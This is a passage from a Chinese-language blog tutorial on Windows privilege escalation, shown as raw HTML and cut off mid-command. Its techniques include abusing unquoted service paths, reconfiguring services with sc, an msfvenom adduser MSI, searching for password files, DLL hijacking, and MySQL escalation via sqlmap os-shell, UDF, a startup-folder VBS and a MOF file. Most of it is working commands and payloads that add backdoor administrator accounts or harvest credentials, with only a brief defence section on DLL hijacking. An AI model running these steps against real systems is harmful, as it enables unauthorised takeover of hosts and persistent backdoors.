class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\haha&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-5DQV85P 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">lowuser                  WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="1-不带引号的的路径服务"><a href="#1-不带引号的的路径服务" class="headerlink" title="1.不带引号的的路径服务"></a>1.不带引号的的路径服务</h3><h4 id="1-简述"><a href="#1-简述" class="headerlink" title="1.简述"></a>1.简述</h4><p>当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。当Windows服务运行时，会发生以下两种情况之一。</p><p>1.如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。</p><p>2.如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p><p>若是第二种，例如<code>C:\WeakServices\Weak Service 1\service1.exe</code></p><p>​寻找路径为 <code>1.C:\WeakServices\Weak</code></p><p>​ <code>2.C:\WeakServices\Weak Service 1</code></p><p>​ <code>3.C:\WeakServices\Weak Service 1\service1.exe</code></p><h4 id="2-利用方法"><a href="#2-利用方法" class="headerlink" title="2.利用方法"></a>2.利用方法</h4><p>根据此寻找方式，可以将C:\WeakServices\Weak替换为C:\WeakServices\Weak.exe，Weak.exe为我们的马，因为在寻找二进制过程中，当发现由exe结尾的就会认为是对应服务的二进制文件</p><p>要想寻找不带引号的路径，可以使用wmic命令</p><p><code>wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code>  startmode:启动方式；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lowuser&gt;wmic service get name,displayname,startmode,pathname | findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</span><br><span class="line">DisplayName                                            Name                                      PathName                                                                           StartMode</span><br><span class="line">LSM                                                    LSM                                                                                                                          Unknown</span><br><span class="line">NetSetupSvc                                            NetSetupSvc                                                                                                                  Unknown</span><br><span class="line">Unquoted Service Path                                  WeakService1                              C:\WeakServices\Weak Service 1\service1.exe                                        Auto</span><br><span class="line">Weak Folder Permissions                                WeakService2                              C:\WeakServices\WeakService2\service2.exe                                          Auto</span><br><span class="line">Weak Service Permissions                               WeakService3                              C:\WeakServices\WeakService3\service3.exe                                          Auto</span><br><span class="line">Weak Registry Permissions                              WeakService4                              C:\WeakServices\WeakService4\service4.exe                                          Manual</span><br><span class="line"></span><br><span class="line">C:\Users\lowuser&gt;</span><br></pre></td></tr></table></figure><p>使用sc查看对应的服务信息：<code>sc qc [servicename]</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lowuser&gt;sc qc WeakService1</span><br><span class="line">[SC] QueryServiceConfig 成功</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: WeakService1</span><br><span class="line">        TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">        START_TYPE         : 2   AUTO_START</span><br><span class="line">        ERROR_CONTROL      : 1   NORMAL</span><br><span class="line">        BINARY_PATH_NAME   : C:\WeakServices\Weak Service 1\service1.exe</span><br><span class="line">        LOAD_ORDER_GROUP   :</span><br><span class="line">        TAG                : 0</span><br><span class="line">        DISPLAY_NAME       : Unquoted Service Path</span><br><span class="line">        DEPENDENCIES       :</span><br><span class="line">        SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure><p>注意到START_TYPE : 2   AUTO_START，意思为该服务随系统启动而自启动，当低权限用户无法重启服务时，我们可以等待目标系统重启来上线我们的马</p><p>另外也可以查看该服务的父目录BINARY_PATH_NAME的权限<code>icacls [path]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lowuser&gt;icacls  C:\WeakServices\</span><br><span class="line">C:\WeakServices\ BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">                 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">                 BUILTIN\Users:(I)(OI)(CI)(RX)</span><br><span class="line">                 NT AUTHORITY\Authenticated Users:(I)(M)</span><br><span class="line">                 NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)</span><br><span class="line"></span><br><span class="line">已成功处理 1 个文件; 处理 0 个文件时失败</span><br><span class="line"></span><br><span class="line">C:\Users\lowuser&gt;</span><br></pre></td></tr></table></figure><p>发现为system权限，即为我们想要的。((M)代表修改权限，(F)代表完全控制，(CI)代表从属容器将继承访问控制项，(OI)代表从属文件将继承访问控制项。)</p><p>但是获得meterpreter会话后不久就会断掉，这是因为当一个服务在Windows系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。我们所有需要做的就是在终止载荷进程之前，将它迁移到其它进程，也可以使用自动迁移：<code>set AutoRunScript migrate -f</code></p><h4 id="3-实际应用"><a href="#3-实际应用" class="headerlink" title="3.实际应用"></a>3.实际应用</h4><p>1.msf生成一个马取名为Weak.exe将其放置在C:\WeakServices\下，重启目标机后msf上线，再迁移进程</p><p>2.msf下已经集成了该模块(exploit&#x2F;windows&#x2F;local&#x2F;trusted_service_path )</p><h3 id="2-弱文件夹权限"><a href="#2-弱文件夹权限" class="headerlink" title="2.弱文件夹权限"></a>2.弱文件夹权限</h3><p>AccessChk可查找用户可修改的服务</p><p>当查询到的服务是<code>RW Everyone</code>之后，将马替换成服务启动的exe，等待重启系统即可。</p><h3 id="3-不安全的服务权限"><a href="#3-不安全的服务权限" class="headerlink" title="3.不安全的服务权限"></a>3.不安全的服务权限</h3><p>当用户对某种服务拥有过多的权限时也可造成攻击</p><p>AccessChk可查找用户可修改的服务</p><p><code>accesschk.exe -uwcqv “Authenticated Users” * /accepteula</code></p><p><code>accesschk.exe -uwcqv “user” *</code></p><p>sc也可：<code>sc qc “[Service]”</code></p><p>利用手法</p><p>1.修改服务的BINARY_PATH_NAME,并重启该服务即可提升system权限。</p><p><code>sc config [servicename] binPath=[path] obj=LocalLystem</code></p><p>2.修改服务配置执行命令。BINARY_PATH_NAME参数指向了该服务的可执行程序(PFNET)路径。如果我们将这个值修改成任何命令，那意味着这个命令在该服务下一次启动时，将会以SYSTEM权限运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sc config PFNET binpath= &quot;net user rottenadmin P@ssword123! /add&quot; </span><br><span class="line">sc stop PFNET</span><br><span class="line">sc start PFNETsc config PFNET binpath= &quot;net localgroup rottenadmin P@ssword123! /add&quot; </span><br><span class="line">sc stop PFNET </span><br><span class="line">sc start PFNET</span><br></pre></td></tr></table></figure><p>当尝试启动服务时，它会返回一个错误。这一点我们之前已经讨论过了，在Windows系统中，当一个服务在Windows系统中启动后，它必须和服务控制管理器通信。如果没有通信，服务控制管理器会认为出现了错误，并会终止这个进程。上面的“net user”肯定是无法和服务管理器通信的，但是不用担心，我们的命令已经以SYSTEM权限运行了，并且成功添加了一个用户。</p><h3 id="4-注册表权限不足"><a href="#4-注册表权限不足" class="headerlink" title="4.注册表权限不足"></a>4.注册表权限不足</h3><p>本地没有复现成功，后续会补上</p><h3 id="5-AlwaysInstallElevated"><a href="#5-AlwaysInstallElevated" class="headerlink" title="5.AlwaysInstallElevated"></a>5.AlwaysInstallElevated</h3><p>AlwaysInstallElevated是一个策略设置，允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他，当在系统中使用Windows Installer安装任何程序时，该参数允许非特权用户以system权限运行MSI文件。如果目标系统上启用了这一设置，我们可以使用msf生成msi文件来以system权限执行任意payload。</p><p>可以通过查询以下注册表来识别此设置，当两个注册表键值查询结果均为1时，代表该策略已启用。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] “AlwaysInstallElevated”=dword:00000001</span><br></pre></td></tr></table></figure><p>使用reg query命令查询是否存在漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedor</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>如果目标机不存在漏洞会输出以下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Instal</span><br><span class="line">ler /v AlwaysInstallElevated</span><br><span class="line">错误: 系统找不到指定的注册表项或值。</span><br></pre></td></tr></table></figure><p>如果存在漏洞会输出以下</p><p><img src="%5Cimages%5C2.png%5C" alt="q"></p><p>使用msf生成msi文件进行提权</p><p><code>msfvenom -p windows/adduser USER=test000 PASSWORD=password123! -f msi -o rotten.msi</code></p><p>目标机执行</p><p><code>msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi </code></p><p>​ &#x2F;quiet :安装过程中禁止向用户发送消息 ; &#x2F;qn : 不使用GUI ;   &#x2F;i : 安装程序</p><p>成功：</p><p><img src="%5Cimages%5C3.png%5C" alt="q"></p><h3 id="6-Unattended-Installs"><a href="#6-Unattended-Installs" class="headerlink" title="6.Unattended Installs"></a>6.Unattended Installs</h3><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p><p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\ </span><br><span class="line">C:\Windows\Panther\Unattend\ </span><br><span class="line">C:\Windows\System32\ </span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure><p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。可以使用以下命令查看</p><p><code>dir C:*vnc.ini /s /b /c</code></p><p>或者在名称中包含关键词的项目：</p><p><code>dir C:\ /s /b /c | findstr /sr *password*</code></p><p>或者可以在文件内容中搜索password之类的关键字：</p><p><code>findstr /si password *.txt | *.xml | *.ini</code></p><p>可以查询注册表，例如，字符串password：</p><p><code>reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s</code></p><p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。</p><p>msf模块（post&#x2F;windows&#x2F;gather&#x2F;enum_unattend ）</p><h2 id="6-powerup"><a href="#6-powerup" class="headerlink" title="6.powerup"></a>6.powerup</h2><p>由于本地没有配置环境，以后再更吧</p><p><a href="http://www.vuln.cn/6436">http://www.vuln.cn/6436</a></p><h2 id="7-dll相关操作"><a href="#7-dll相关操作" class="headerlink" title="7.dll相关操作"></a>7.dll相关操作</h2><h3 id="1-dll劫持"><a href="#1-dll劫持" class="headerlink" title="1.dll劫持"></a>1.dll劫持</h3><h4 id="1-dll劫持原理"><a href="#1-dll劫持原理" class="headerlink" title="1.dll劫持原理"></a>1.dll劫持原理</h4><ul><li>Windows XP SP2之前，Windows查找DLL的目录以及对应的顺序：</li></ul><p>​1.进程对应的应用程序所在目录；</p><p>​2.当前目录（Current Directory）；</p><p>​3.系统目录（通过 GetSystemDirectory 获取）；</p><p>​4.16位系统目录；</p><p>​5.Windows目录（通过 GetWindowsDirectory 获取）；</p><p>​6.PATH环境变量中的各个目录；</p><p>​例如：对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</p><ul><li><p>在winxdows xp sp2之后，Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</p><p>默认注册表为：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code>，其键值为1</p></li></ul><p>​1.进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</p><p>​2.系统目录（即%windir%system32）；</p><p>​3.16位系统目录（即%windir%system）；</p><p>​4.Windows目录（即%windir%）；</p><p>​5.当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</p><p>​6.PATH环境变量中的各个目录；</p><ul><li><p>windows7以上</p><p>系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p><p>那么最终Windows203以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</p><ul><li>默认情况下，如果软件安装在c盘根目录，而不是c:\Program Files，那经过身份验证的用户具有该目录的写权限，另外，perl，python，ruby等软件通常都添加到path变量中。那攻击者可以在当前目录中编写恶意DLL，只要重新运行exe程序就会中招。</li><li>SafeDllSearchMode + KnownDLLs二者结合可用来防范dll劫持，但是如果调用”不常见”的dll，也就是并未出现在KnownDLLs的列表中，那么无论SafeDllSearchMode是否开启，dll搜索的第一顺序均为程序的当前目录，这里就存在一个DLL劫持漏洞（在程序同级目录下预先放置一个同名dll，在进程启动的过程中会优先加载，实现劫持。</li></ul></li></ul><h4 id="2-实例演示"><a href="#2-实例演示" class="headerlink" title="2.实例演示"></a>2.实例演示</h4><p>这里就不演示了，只是提供一个思路吧，后续会补发文章。</p><p>1.启动应用程序<br> 2.使用Process Explorer等类似软件查看该应用程序启动后加载的动态链接库。<br> 3.从该应用程序已经加载的DLL列表中，查找在上述“KnownDLLs注册表项”中不存在的DLL。<br> 4.编写第三步中获取到的DLL的劫持DLL（不考虑软件是否正常运行可以直接使用msf生成一个dll进行替换；反之可以使用<a href="https://github.com/coca1ne/DLL_Hijacker">DLL_Hijacker.py</a>生成指定dll的cpp文件，再编译为dll文件，具体操作请查阅资料，这里不再提供了）。<br> 5.将编写好的劫持DLL放到该应用程序目录下，重新启动该应用程序，检测是否劫持成功。</p><h4 id="3-防范"><a href="#3-防范" class="headerlink" title="3.防范"></a>3.防范</h4><p>1、开发者需要注意的问题：</p><p>调用第三方DLL时，使用LoadLibrary API加载DLL时使用绝对路径，类似的情况还包括其他API如LoadLibraryEx, CreateProcess, ShellExecute等，将所有需要使用到的DLL放在应用程序所在的目录，不放到系统目录或者其他目录。</p><p>调用系统DLL时，使用绝对路径</p><p>程序启动时调用API SetDllDirectory(L”“)将当前目录从DLL加载顺序中移除</p><p>补充：</p><p>从Windows 7的KB2533623补丁开始，微软更新了三个解决DLL劫持问题的新API：SetDefaultDllDirectories，AddDllDirectory，RemoveDllDirectory这几个API配合使用，可以有效的规避DLL劫持问题</p><p>但是这些API只能在打了KB2533623补丁的Windows7和Server2008上使用</p><p>详情见：</p><p><a href="https://support.microsoft.com/zh-cn/kb/2533623">https://support.microsoft.com/zh-cn/kb/2533623</a></p><p>2、用户需要注意的问题：</p><p>留意浏览器下载目录下是否有可疑dll，防止其劫持下载的安装程序</p><p>对于“不可信”的程序，建议使用Process Monitor或者Rattler检查是否存在DLL劫持漏洞</p><h3 id="2-dll注入"><a href="#2-dll注入" class="headerlink" title="2.dll注入"></a>2.dll注入</h3><p>后面和dll劫持均开一篇单独更吧，先看一下下面这篇文章</p><p><a href="https://www.anquanke.com/post/id/86671">https://www.anquanke.com/post/id/86671</a></p><p>针对dll劫持和dll注入后续会专门写文章来阐述清楚，这里只是先做一个提示。</p><h2 id="8-数据库提权"><a href="#8-数据库提权" class="headerlink" title="8.数据库提权"></a>8.数据库提权</h2><h3 id="1-mysql提权"><a href="#1-mysql提权" class="headerlink" title="1.mysql提权"></a>1.mysql提权</h3><h4 id="1-sqlmap提权"><a href="#1-sqlmap提权" class="headerlink" title="1.sqlmap提权"></a>1.sqlmap提权</h4><p>测试环境：win7、2k3、2k8均可，ver(mysql)&gt;&#x3D;5.0也可</p><p>mysql需要设置<code>grant all privileges on *.* to &#39;连接的账户名&#39;@&#39;%&#39; identified by &#39;密码&#39;;</code></p><p>如果只想某指定ip访问，可将%替换为指定ip  ,再重启服务即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -d &quot;mysql://root:root@192.168.8.64:3306/mysql&quot; --os-shell</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                   </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.4.11#stable&#125;                                                      </span><br><span class="line">|_ -| . [&#x27;]     | .&#x27;| . |                                                                      </span><br><span class="line">|___|_  [(]_|_|_|__,|  _|                                                                      </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                    </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 12:05:59 /2020-11-22/</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">太长了，无关紧要，省略</span><br><span class="line">...</span><br><span class="line">what is the back-end database management system architecture?</span><br><span class="line">[1] 32-bit (default)</span><br><span class="line">[2] 64-bit</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">2</span></span><br><span class="line">...</span><br><span class="line">太长了，无关紧要，省略</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">os-shell&gt; </span></span><br></pre></td></tr></table></figure><h4 id="2-udf提权"><a href="#2-udf提权" class="headerlink" title="2.udf提权"></a>2.udf提权</h4><p>现在大多数Mysql版本都大于5.1，版本大于5.1后对于提权的条件很苛刻，所以大多数情况下都没办法使用udf进行一个提权</p><p>测试环境：winserver2012、ver(mysql)&gt;&#x3D;5.0、phpmyadmin（或者能够连接到mysql数据库的就OK）</p><p><strong>udf</strong>：UDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 由于是用户自定义的函数，所以我们可以利用UDF创建一个执行命令的函数。mysql会调用一些资源，会把当前账号转化为system权限</p><p><strong>需要有以下注意项</strong>：</p><ul><li>version(mysql)&gt;5.1：udf.dll文件需上传到mysql的安装目录的lib\plugin下</li><li>5.0&lt;&#x3D;version(mysql)&lt;5.1：udf.dll文件需上传到c:\windows\system32(win2003版本)</li><li>version(mysql)&lt;5.0：上传路径随意</li><li>掌握mysql数据库的账户，拥有对mysql的insert和delete权限，以创建和抛弃函数。</li><li>拥有可以将udf.dll写入相应目录的权限。</li></ul><p>sqlmap自带udf.dll位置:&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;  分为linux、windows两个版本</p><p><strong>提权方式</strong></p><ul><li>1、首先查看mysql版本：<code>select version();</code></li><li>2、再将符合mysql版本的udf文件上传至对应目录，但是需注意的是Sqlmap将原本的dll文件进行了编码处理,我们需要通过脚本进行解密获得dll文件。 执行<code>python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll</code>进行dll文件的解码，获得dll文件。</li><li>3、这里获得的dll文件，是一个二进制进制文件，我们通过查询语句将dll上传到目标服务器上。由于目标版本为<code>5.0&lt;=mysql&lt;5.1</code> ，所以将dll文件上传到目标的系统目录下面。执行语句<code>select 0x[code] into dumpfile &#39;C:\\Windows\\System32\\cooltige.dll&#39;</code>（关于此语句可以查看linux提权中的udf提权）。</li><li>4、通过dll文件创建函数。<code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;cooltige.dll&#39;</code></li><li>5、创建成功后就可以直接执行命令。例如：<code>select sys_eval(&#39;whoami&#39;)</code></li><li>6、删除创建的函数<code>DROP FUNCTION sys_eval;</code></li><li>7、验证函数是否删除成功，输出结果为N&#x2F;A就为删除成功。<code>select * from mysql.func where name = &#39;sys_eval&#39;;</code></li></ul><p>另外如果有大马就不用这么麻烦，直接上传udf文件，再执行命令就可以了，不用上述方法的2、3步了</p><h4 id="3-开机启动项提权"><a href="#3-开机启动项提权" class="headerlink" title="3.开机启动项提权"></a>3.开机启动项提权</h4><p>前提：mysql：root，system运行</p><p>利用MySQL，将后门写入开机启动项。同时因为是开机自启动，再写入之后，需要重启目标服务器，才可以运行。</p><p>一般这么搞多是windows下的mysql环境，将一段 VBS脚本导入到  C:\Documents and Settings\All Users\「开始」菜单\程序\启动 下，如果管理员重启了服务器，那么就会自动调用该脚本，并执行其中的用户添加及提权命令</p><p>vbs代码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">setwsnetwork=CreateObject(&quot;WSCRIPT.NETWORK&quot;)</span><br><span class="line">os=&quot;WinNT://&quot;&amp;wsnetwork.ComputerName</span><br><span class="line">Set ob=GetObject(os)</span><br><span class="line">Setoe=GetObject(os&amp;&quot;/Administrators,group&quot;)</span><br><span class="line">Set od=ob.Create(&quot;user&quot;,&quot;secist&quot;)</span><br><span class="line">od.SetPassword &quot;secist.com&quot;</span><br><span class="line">od.SetInfo</span><br><span class="line">Set of=GetObject(os&amp;&quot;/secist&quot;,user)</span><br><span class="line">oe.add os&amp;&quot;/secist&quot;</span><br></pre></td></tr></table></figure><p>亦或者通过大马的mysql执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create table secist(cmd text);</span><br><span class="line"></span><br><span class="line">insert into secist values(“set wshshell=createobject(“”wscript.shell””)”);</span><br><span class="line"></span><br><span class="line">insert into secist values(“a=wshshell.run(“”cmd.exe /c net user secist secist.com /add“”,0)”);</span><br><span class="line"></span><br><span class="line">insert into secist values(“b=wshshell.run(“”cmd.exe /c net localgroup administrators secist /add“”,0)”);</span><br><span class="line"></span><br><span class="line">select * from secist into dumpfile “C:\Documents and Settings\All Users\「开始」菜单\程序\启动\secist.vbs”;</span><br></pre></td></tr></table></figure><p>成功执行以上命令后，只要管理员重启了服务器，我们就可以成功提权了！</p><h4 id="4-mof提权"><a href="#4-mof提权" class="headerlink" title="4.mof提权"></a>4.mof提权</h4><p><strong>前提</strong>：version(win)&lt;03、mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录、secure-file-priv参数不为null</p><p><strong>secure-file-priv</strong>：secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的</p><ul><li>当secure_file_priv的值为null ，表示限制mysql不允许导入导出。</li><li>当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysql的导入导出只能发生在&#x2F;tmp&#x2F;目录下。</li><li>当secure_file_priv的值没有具体值时，表示不对mysql的导入导出做限制。</li></ul><p>通过执行<code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看secure-file-priv的状态。</p><p><strong>原理</strong>：利用 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 nullevt.mof 文件每5秒钟去执行一次的特性，且为system权限，通过mysql使用load_file 将文件写入&#x2F;wbme&#x2F;mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p><p><strong>MOF文件</strong>：托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:&#x2F;windows&#x2F;system32&#x2F;wbme&#x2F;mof&#x2F;，其作用是每隔五秒就会去监控进程创建和死亡。</p><p><strong>nullevt.mof</strong>(注：实际是利用其达到：<code>net.exe user hpdoger 123456 /add\</code>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>文件利用</strong></p><p>将nullevt.mof传到具有读写权限的目录下，在phpmyadmin中利用load_file将其传入到<code>c:/windows/system32/wbem/mof/</code>下（不用outfile是因为其会在末端写入新行，被当作二进制文件时无法执行，故使用dumpfile导出一行数据）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;;</span><br></pre></td></tr></table></figure><p>之后mof会被直接执行，且5秒创建一次用户，之后就是将创建的用户的那一行代码换成加入administrator即可</p><p><code>net.exe user localgroup administrator hpdoger /add\</code></p><p><strong>弊端</strong></p><p>每5秒创建一次，不好删。。。</p><p>其实也可删的，cmd下面执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start 